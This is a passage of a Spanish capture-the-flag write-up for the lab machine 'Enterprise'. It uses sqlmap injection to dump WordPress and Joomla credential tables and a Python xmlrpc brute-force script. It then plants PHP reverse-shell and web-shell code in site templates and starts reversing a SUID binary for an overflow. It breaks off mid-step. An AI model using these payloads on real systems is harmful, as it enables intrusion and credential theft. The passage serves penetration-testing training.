--url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch --dbs available databases [8]: [*] information_schema [*] joomla [*] joomladb [*] mysql [*] performance_schema [*] sys [*] wordpress [*] wordpressdb Una vez que ya sabemos que bases de datos, vamos a ver quÃ© tablas hay de la base de datos del wordpress, para ello con -D vamos a especificar la base de datos y con --tables vamos a listar las tablas\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D wordpress --tables Database: wordpress [12 tables] +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ Ahora vamos a sacar toda la informaciÃ³n de la tabla wp_users, para especificar la tabla vamos a usar -T y para ver el contenido --dump\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D wordpress -T wp_users --dump Database: wordpress Table: wp_users [1 entry] +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ | 1 | \u0026lt;blank\u0026gt; | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0 | william.riker | william-riker | 2017-09-03 19:20:56 | \u0026lt;blank\u0026gt; | +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ Ya podemos confirar la existencia del usuario william.riker y tenemos su contraseÃ±a hasheada: $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.. Este hash lo podemos intentar romper de la siguiente forma.\necho \u0026#39;$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.\u0026#39; \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Lo dejÃ© corriendo un buen rato y nada, no puede sacar la pass, asÃ­ que vamos a seguir enumerando la base de datos. Vamos a ver el contenido de la tabla wp_posts\nEn la columna post_content vemos que hay 3 entradas que contienen el siguiente texto\nNeeded somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nZD3YxfnSjezg67JZ\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n Para que interprete los enters podemos usar python:\n$python3 \u0026gt;\u0026gt;\u0026gt; print(\u0026#39;Needed somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nZD3YxfnSjezg67JZ\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n\u0026#39;) Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 Parece que ya tenemos 4 contraseÃ±as que a lo mejor son las del wordpress. No las vamos a probar una a una, vamos a hacer fuerza bruta automatizada de 3 formas distintas\nEste wordpress tiene el xmlrpc.php accesible asÃ­ que nos podemos aprovechar de Ã©l para hacer la fuerza bruta. Primero vamos a listar los mÃ©todos que tiene disponibles, mandÃ¡ndole una peticiÃ³n por post con la siguiente data\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;system.listMethods\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt;\u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; curl -X POST \u0026#34;http://enterprise.htb/xmlrpc.php\u0026#34; -d@data.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;methodResponse\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; \u0026lt;array\u0026gt;\u0026lt;data\u0026gt; ..... \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.getPost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.deletePost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.editPost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.newPost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.getUsersBlogs\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/data\u0026gt;\u0026lt;/array\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodResponse\u0026gt; El mÃ©todo wp.getUsersBlogs estÃ¡ disponible, con este mÃ©todo podemos hacer fuerza bruta con la siguiente data sustituyendo el parÃ¡metro username por el usuario y password por la contraseÃ±a\n\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;UTF-8\\\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;wp.getUsersBlogs\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;USERNAME\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;PASSWORD\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; Al mandar esta peticiÃ³n recibimos lo siguiente\ncurl -X POST \u0026ldquo;http://enterprise.htb/xmlrpc.php\u0026rdquo; -d@data.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;methodResponse\u0026gt; .... \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;Incorrect username or password.\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; .... \u0026lt;/methodResponse\u0026gt; Ahora vamos a hacer un script en python para automatizar esta comprobaciÃ³n de usuarios y guardaremos todos las contraseÃ±as en un archivo llamado passwords.txt\nimport requests from pwn import * url = \u0026#34;http://enterprise.htb/xmlrpc.php\u0026#34; dict = \u0026#34;passwords.txt\u0026#34; user = \u0026#34;william.riker\u0026#34; data = \u0026#34;\u0026#34;\u0026#34; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;wp.getUsersBlogs\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;{}\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;param\u0026gt;\u0026lt;value\u0026gt;{}\u0026lt;/value\u0026gt;\u0026lt;/param\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; \u0026#34;\u0026#34;\u0026#34; p1 = log.progress(\u0026#34;NÃºmero de contraseÃ±as probadas\u0026#34;) p2 = log.progress(\u0026#34;ContraseÃ±a\u0026#34;) words = 0 with open(dict, \u0026#39;r\u0026#39;) as diccionario: for i in diccionario: words += 1 p1.status(words) a = requests.post(url, data=data.format(user, i)) if \u0026#34;Incorrect username or password\u0026#34; not in a.text: p2.success(i) p1.success(words) Al principio del script se declaran 4 variables, la url con la ruta del xmlrpc.php, el diccionario de posibles contraseÃ±as, el usuario con el cual se van a probar las contraseÃ±as y la data que se va a mandar por post, con unos \u0026ldquo;{}\u0026rdquo; donde irÃ­a el user y la pass, indicando que ahÃ­ va a ir una variable que haremos mÃ¡s adelante. DespuÃ©s abrimos el diccionario y hacemos un bucle for por cada lÃ­nea que haya en el diccionario. A continuaciÃ³n se manda una solicitud con la contraseÃ±a que toca en la iteraciÃ³n del diccionario y se comprueba si la respuesta contiene la frase \u0026ldquo;Incorrect username or password\u0026rdquo;. Si no contiene esa frase significa que las credenciales son correctas\npython3 script.py [+] NÃºmero de contraseÃ±as probadas: 4 [+] ContraseÃ±a: u*Z14ru0p#ttj83zS6 Ahora ya tenemos la contraseÃ±a del wordpress y podemos iniciar sesiÃ³n en /wp-admin, una vez iniciada la sesiÃ³n para mandarnos una reverse shell simplemente vamos a Appearance \u0026gt; Editor \u0026gt; 404 template. Vamos a modificar el 404.php que es el que se muestra cuando vamos a una ruta equivocada y vamos a aÃ±adir la siguiente lÃ­nea\nsystem(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;); Nos ponemos en escucha con netcat\nnc -nlvp 443 ExplicaciÃ³n parÃ¡metros\rn: Sirve para que no haga la resoluciÃ³n de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por Ãºltimo la p sirve para especificar el nÃºmero de puerto en el cual vamos a estar en escucha Por Ãºltimo hacemos un curl a un post que no exsÃ­sta\ncurl http://enterprise.htb/?p=10000000 Y recibimos la conexiÃ³n\nlistening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.61] 32890 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@b8319d86d21e:/var/www/html$ Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por Ãºltimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Al ver nuestra ip vemos que no es la de la mÃ¡quina vÃ­ctima:\nwww-data@b8319d86d21e:/var/www/html$ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 6: eth0@if7: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff inet 172.17.0.3/16 scope global eth0 valid_lft forever preferred_lft forever Si listamos el contenido de la raÃ­z vemos que estamos en un contenedor docker por la existencia del archivo .dockerenv\nwww-data@b8319d86d21e:/var/www/html$ ls -la / total 72 drwxr-xr-x 73 root root 4096 May 30 2022 . drwxr-xr-x 73 root root 4096 May 30 2022 .. -rwxr-xr-x 1 root root 0 Sep 3 2017 .dockerenv Volviendo al tema de la ip hemos visto que tenemos la 172.17.0.3 la 172.17.0.1 es la mÃ¡quina host que seguramente serÃ¡ la 10.10.10.61. Pero es raro que se nos haya asignado la ip 172.17.0.3 y no la 172.17.0.2, puede ser que haya mÃ¡s de un contenedor docker y que en la .2 haya un contenedor. Esto lo podemos comprobar con un ping.\nwww-data@b8319d86d21e:/var/www/html$ ping -c 1 172.17.0.2 PING 172.17.0.2 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.061 ms --- 172.17.0.2 ping statistics --- 1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max/stddev = 0.061/0.061/0.061/0.000 ms Efectivamente existe un contenedor en la .2. Si volvemos al inicio, habÃ­a una tercera web corriendo por el puerto 8080, antes de entrar vamos a hacerle un whatweb como la de wordpress para ver que es.\nwhatweb 10.10.10.61:8080 http://10.10.10.61:8080 [200 OK] Apache[2.4.10], Bootstrap, Cookies[14cd8f365a67fad648754407628a1809], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], HttpOnly[14cd8f365a67fad648754407628a1809], IP[10.10.10.61], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PHP[7.0.23], PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/7.0.23] Â¡Es un joomla! SÃ­ recordamos en la sqli de wordpress habÃ­a una base de datos de joomla asÃ­ que podemos sacar usuarios y contraseÃ±as. Primero enumeramos las tablas.\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D joomladb --tables Database: joomladb [72 tables] +-------------------------------+ | edz2g_assets | | edz2g_associations | | edz2g_banner_clients | | edz2g_banner_tracks | | edz2g_banners | | edz2g_categories | | edz2g_contact_details | | edz2g_content | | edz2g_content_frontpage | | edz2g_content_rating | | edz2g_content_types | | edz2g_contentitem_tag_map | | edz2g_core_log_searches | | edz2g_extensions | | edz2g_fields | | edz2g_fields_categories | | edz2g_fields_groups | | edz2g_fields_values | | edz2g_finder_filters | | edz2g_finder_links | | edz2g_finder_links_terms0 | | edz2g_finder_links_terms1 | | edz2g_finder_links_terms2 | | edz2g_finder_links_terms3 | | edz2g_finder_links_terms4 | | edz2g_finder_links_terms5 | | edz2g_finder_links_terms6 | | edz2g_finder_links_terms7 | | edz2g_finder_links_terms8 | | edz2g_finder_links_terms9 | | edz2g_finder_links_termsa | | edz2g_finder_links_termsb | | edz2g_finder_links_termsc | | edz2g_finder_links_termsd | | edz2g_finder_links_termse | | edz2g_finder_links_termsf | | edz2g_finder_taxonomy | | edz2g_finder_taxonomy_map | | edz2g_finder_terms | | edz2g_finder_terms_common | | edz2g_finder_tokens | | edz2g_finder_tokens_aggregate | | edz2g_finder_types | | edz2g_languages | | edz2g_menu | | edz2g_menu_types | | edz2g_messages | | edz2g_messages_cfg | | edz2g_modules | | edz2g_modules_menu | | edz2g_newsfeeds | | edz2g_overrider | | edz2g_postinstall_messages | | edz2g_redirect_links | | edz2g_schemas | | edz2g_session | | edz2g_tags | | edz2g_template_styles | | edz2g_ucm_base | | edz2g_ucm_content | | edz2g_ucm_history | | edz2g_update_sites | | edz2g_update_sites_extensions | | edz2g_updates | | edz2g_user_keys | | edz2g_user_notes | | edz2g_user_profiles | | edz2g_user_usergroup_map | | edz2g_usergroups | | edz2g_users | | edz2g_utf8_conversion | | edz2g_viewlevels | +-------------------------------+ Ahora vamos a ver el contenido de la tabla edz2g_users\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D joomladb -T edz2g_users --dump Database: joomladb Table: edz2g_users [2 entries] +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ | id | otep | email | name | otpKey | params | block | password | username | sendEmail | activation | resetCount | registerDate | requireReset | lastResetTime | lastvisitDate | +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ | 400 | \u0026lt;blank\u0026gt; | geordi.la.forge@enterprise.htb | Super User | \u0026lt;blank\u0026gt; | {\u0026#34;admin_style\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;admin_language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;editor\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;helpsite\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timezone\u0026#34;:\u0026#34;\u0026#34;} | 0 | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge | 1 | 0 | 0 | 2017-09-03 19:30:04 | 0 | 0000-00-00 00:00:00 | 2017-10-17 04:24:50 | | 401 | \u0026lt;blank\u0026gt; | guinan@enterprise.htb | Guinan | \u0026lt;blank\u0026gt; | {\u0026#34;admin_style\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;admin_language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;editor\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;helpsite\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timezone\u0026#34;:\u0026#34;\u0026#34;} | 0 | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | Guinan | 0 | \u0026lt;blank\u0026gt; | 0 | 2017-09-06 12:38:03 | 0 | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 | +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ Vemos 2 usuarios con sus respectivas credenciales hasheadas las cuales podemos tratar de romper con john\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Lo dejÃ© un buen rato, pero no las encuentra. Puede ser que alguna de las credenciales que habÃ­a en el post de wordpress sean las del joomla. Con este script podemos hacer fuerza bruta para encontrar las credenciales correctas del joomla\npython3 joomla-brute.py -u http://10.10.10.61:8080 -usr geordi.la.forge -w passwords.txt geordi.la.forge:ZD3YxfnSjezg67JZ Ya tenemos credenciales vÃ¡lidas para el Joomla como Super user. Para mandarnos la reverse shell es bastante parecido a wordpress, simplemente hay que ir a Extensions \u0026gt; Templates \u0026gt; Templates \u0026gt; El tema que estÃ© en uso \u0026gt; error.php y pegamos el mismo cÃ³digo de wordpress.\nsystem(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;); Nos ponemos en escucha con netcat\nnc -nlvp 443 ExplicaciÃ³n parÃ¡metros\rn: Sirve para que no haga la resoluciÃ³n de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por Ãºltimo la p sirve para especificar el nÃºmero de puerto en el cual vamos a estar en escucha Y hacemos un curl a una pÃ¡gina random que no exista de la web.\ncurl http://10.10.10.61:8080/testing Â¡Recibimos la conexiÃ³n!\nlistening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.61] 42390 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell www-data@a7018bfdc454:/var/www/html$ Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por Ãºltimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Si hacemos un ip a vemos que estamos en un contenedor distinto al de wordpress\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 8: eth0@if9: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:04 brd ff:ff:ff:ff:ff:ff inet 172.17.0.4/16 scope global eth0 valid_lft forever preferred_lft forever Escalada de privilegios Saliendo del docker En la consola que hemos obtenido con el Joomla si vamos a /var/www/html vemos que hay una carpeta llamada files, dentro de la carpeta hay un lcars.zip. Esto es lo mismo que veiamos desde la web que corria por el puerto 443, puede ser que tengan esta carpeta sincronizada. Dentro de la carpeta files tenemos capazidad de escritura, podemos poner un php malicioso e intentarlo ejecutar desde la web que corre por el puerto 443.\n8bfdc454:/var/www/html/files$ echo \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; \u0026gt; script.php Ahora si entramos en la web, abrimos el script.php y por get por el parametro cmd le ponemos un comando vemos el resultado\nhttps://10.10.10.61/files/script.php?cmd=ls Para mandar la reversres shell vamos a usar lo mismo de siempre (bash -c \u0026ldquo;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.4/443 0\u0026gt;\u0026amp;1\u0026rdquo;) pero lo vamos a passar por un url encoder para que no de problemas\nhttps://10.10.10.61/files/script.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22 Nos ponemos en escucha con netcat\nnc -nlvp 443 ExplicaciÃ³n parÃ¡metros\rn: Sirve para que no haga la resoluciÃ³n de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por Ãºltimo la p sirve para especificar el nÃºmero de puerto en el cual vamos a estar en escucha Recibimos la conexiÃ³n!\nlistening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.61] 37558 bash: cannot set terminal process group (1531): Inappropriate ioctl for device bash: no job control in this shell www-data@enterprise:/var/www/html/files$ Antes de continuar con la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por ultimo si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash root Buscando archivos con permisos SUID vemos que existe uno llamado lcars (Como el plugin), el cual su propietario es root y tiene permisos SUID asÃ­ que si lo ejecutamos lo estamos ejecutando como root\nwww-data@enterprise:/$ find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null ..... -rwsr-xr-x 1 root root 38984 May 18 2017 /bin/mount -rwsr-xr-x 1 root root 12152 Sep 8 2017 /bin/lcars -rwsr-xr-x 1 root root 30800 Aug 11 2016 /bin/fusermount El binario lcars nos lo vamos a pasar a nuestra mÃ¡quina para poder analizarlo con detalle, para pasÃ¡rnoslo, vamos a montar un servidor con python por el puerto 8000 en la carpeta /bin desde la mÃ¡quina vÃ­ctima con python3 -m http.server 8000 y nos lo vamos a descargar a nuestra mÃ¡quina con wget 10.10.10.61/lcars\nBuffer Overflow Para analizar el binario usaremos la herramienta ghydra.\nUna vez estamos en ghydra gracias al â€œauto analyzeâ€ podemos ver el cÃ³digo del binario. Primero vamos a ver el contenido de la funciÃ³n main.\nundefined4 main(void) { char local_19 [9]; undefined *local_10; local_10 = \u0026amp;stack0x00000004; setresuid(0,0,0); startScreen(); puts(\u0026#34;Enter Bridge Access Code: \u0026#34;); fflush(_stdout); fgets(local_19,9,_stdin); bridgeAuth(local_19); return 0; } En la funciÃ³n main vemos que se declara una variable de caracteres llamada local_19 con un mÃ¡ximo de 9 en el tamaÃ±o del buffer. DespuÃ©s se llama a la funciÃ³n startScreen(), la cual se encarga de mostrar el baner del programa.\nvoid startScreen(void) { puts(\u0026#34;\u0026#34;); puts(\u0026#34; _______ _______ ______ _______\u0026#34;); puts(\u0026#34; | | |_____| |_____/ |______\u0026#34;); puts(\u0026#34; |_____ |_____ | | | \\\\_ ______|\u0026#34;); puts(\u0026#34;\u0026#34;); puts(\u0026#34;Welcome to the Library Computer Access and Retrieval System\\n\u0026#34;); return; } Volviendo a la funciÃ³n main, en la siguiente lÃ­nea despuÃ©s de mencionar startScreen() nos muestra el siguiente texto.\nputs(\u0026ldquo;Enter Bridge Access Code: \u0026ldquo;);\nEl valor que le ponemos lo manda a la funciÃ³n bridgeAuth()\nbridgeAuth(local_19);\nLa funciÃ³n bridgeAuth tiene el siguiente cÃ³digo\nvoid bridgeAuth(char *param_1) { char local_32; undefined uStack_31; undefined uStack_30; undefined uStack_2f; undefined uStack_2e; undefined uStack_2d; undefined uStack_2c; undefined uStack_2b; undefined uStack_2a; int local_14; undefined4 local_10; local_32 = \u0026#39;p\u0026#39;; uStack_31 = 0x69; uStack_30 = 99; uStack_2f = 0x61; uStack_2e = 0x72; uStack_2d = 100; uStack_2c = 0x61; uStack_2b = 0x31; local_10 = 9; uStack_2a = 0; local_14 = strcmp(param_1,\u0026amp;local_32); if (local_14 == 0) { main_menu(); } else { puts(\u0026#34;\\nInvalid Code\\nTerminating Console\\n\u0026#34;); } fflush(_stdout); /* WARNING: Subroutine does not return */ exit(0); } En las variables uStack se les da un valor que empieza por 0x lo que indica que el nÃºmero que va despuÃ©s del 0x estÃ¡ en hexadecimal. Sabiendo esto, podemos convertir el valor que se les estÃ¡ dando a texto plano.\nlocal_32 = \u0026#39;p\u0026#39;; uStack_31 = \u0026#39;i\u0026#39;; uStack_30 = \u0026#39;c\u0026#39;; uStack_2f = \u0026#39;a\u0026#39;; uStack_2e = \u0026#39;r\u0026#39;; uStack_2d = \u0026#39;d\u0026#39;; uStack_2c = \u0026#39;a\u0026#39;; uStack_2b = \u0026#39;1\u0026#39;; A continuaciÃ³n se comprueba si nuestro input es igual a picarda1 con el siguiente cÃ³digo.\nlocal_14 = strcmp(param_1, \u0026amp;local_32); Si la comprobaciÃ³n anterior da 0 significarÃ¡ que las cadenas son iguales, en caso contrario las cadenas no serÃ­an iguales. if (local_14 == 0) { main_menu(); } else { puts(\u0026#34;\\nInvalid Code\\nTerminating Console\\n\u0026#34;); } Al poner el cÃ³digo de acceso correcto nos redirige a la funcion main_menu()\nvoid main_menu(void) { undefined4 local_d8 [52]; local_d8[0] = 0; startScreen(); puts(\u0026#34;\\n\u0026#34;); puts(\u0026#34;LCARS Bridge Secondary Controls -- Main Menu: \\n\u0026#34;); puts(\u0026#34;1. Navigation\u0026#34;); puts(\u0026#34;2. Ships Log\u0026#34;); puts(\u0026#34;3. Science\u0026#34;); puts(\u0026#34;4. Security\u0026#34;); puts(\u0026#34;5. StellaCartography\u0026#34;); puts(\u0026#34;6. Engineering\u0026#34;); puts(\u0026#34;7. Exit\u0026#34;); puts(\u0026#34;Waiting for input: \u0026#34;); fflush(_stdout); __isoc99_scanf(\u0026amp;DAT_00010f92,local_d8); /* WARNING: Could not find normalized switch variable to match jumptable */ /* WARNING: This code block may not be properly labeled as switch case */ unable(); return; } La funciÃ³n main_menu() es la que se encarga de mostrarnos el menÃº de opciones despuÃ©s de entrar con el codigÃ³ correcto (picarda1)\nNo podemos ver a que funciones nos redirige al seleccionar una opciÃ³n, pero investigando otras funciones que reporta ghydra, vemos que existe una funciÃ³n llamada disableForcefields\nvoid disableForcefields(void) { undefined local_d4 [204]; startScreen(); puts(\u0026#34;Disable Security Force Fields\u0026#34;); puts(\u0026#34;Enter Security Override:\u0026#34;); fflush(_stdout); __isoc99_scanf(\u0026amp;DAT_00010ec4,local_d4); printf(\u0026#34;Rerouting Tertiary EPS Junctions: %s\u0026#34;,local_d4); return; } Los mensajes de Disable Security Force Fields y Enter Security Override: son los que se muestran en la opciÃ³n 4, asÃ­ que podemos intuir que es el cÃ³digo de la opciÃ³n 4\nLCARS Bridge Secondary Controls \u0026ndash; Main Menu:\nNavigation Ships Log Science Security StellaCartography Engineering Exit Waiting for input: 4\nDisable Security Force Fields Enter Security Override:\nVamos a analizar esta funciÃ³n. Primero de todo se crea una variable donde se va a almacenar nuestro input, esta variable va a tener un tamaÃ±o mÃ¡ximo de buffer asignado de 204.\nundefined local_d4 [204] DespuÃ©s nos devuelve el mensaje Rerouting Tertiary EPS Junctions acompaÃ±ado de nuestro input\nprintf(\u0026#34;Rerouting Tertiary EPS Junctions: %s\u0026#34;,local_d4); Si probamos de ejecutar el binario poniendo muchos caracteres:\nEnter Security Override: 